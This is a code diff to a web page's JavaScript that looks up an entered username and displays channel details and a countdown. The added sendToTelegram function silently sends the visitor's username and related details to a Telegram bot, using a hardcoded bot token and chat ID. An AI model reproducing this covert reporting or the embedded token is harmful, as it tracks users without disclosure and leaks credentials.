@@ -214,26 +214,55 @@
     ];
 
     function checkUsername() {
-        const username = document.getElementById("username").value;
-        const user = database.find(user => user.username === username);
+    const username = document.getElementById("username").value;
+    const user = database.find(user => user.username === username);
 
-        if (user) {
-            document.getElementById("channel").innerText = user.channelName;
-            document.getElementById("qty").innerText = user.quantity;
-            document.getElementById("channelLogo").src = user.logo; // Set channel logo
-            document.getElementById("channelLogo").style.display = 'block'; // Display channel logo
+    if (user) {
+        document.getElementById("channel").innerText = user.channelName;
+        document.getElementById("qty").innerText = user.quantity;
+        document.getElementById("channelLogo").src = user.logo; // Set channel logo
+        document.getElementById("channelLogo").style.display = 'block'; // Display channel logo
 
-            // Show channel information and countdown
-            document.getElementById("info").style.display = 'block';
-            startCountdown(10); // Start countdown with 10 seconds
+        // Send user information to Telegram
+        sendToTelegram(user);
 
-            // Hide input section
-            document.getElementById("username").style.display = 'none';
-            document.querySelector("input[type='submit']").style.display = 'none';
-        } else {
-            alert("Username not found!");
-        }
+        // Show channel information and countdown
+        document.getElementById("info").style.display = 'block';
+        startCountdown(10); // Start countdown with 10 seconds
+
+        // Hide input section
+        document.getElementById("username").style.display = 'none';
+        document.querySelector("input[type='submit']").style.display = 'none';
+    } else {
+        alert("Username not found!");
     }
+}
+
+// Function to send user information to Telegram
+function sendToTelegram(user) {
+    const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+    const chatId = '6471397661';
+    const message = `User Information:\nChannel Name: ${user.channelName}\nQuantity: ${user.quantity}\nUsername: ${user.username}`;
+    
+    // Create the Telegram API URL
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    // Send the message using fetch
+    fetch(telegramUrl)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Message sent successfully', data);
+        })
+        .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+        });
+}
+
 
     function startCountdown(seconds) {
         const countdownElement = document.getElementById("countdown");
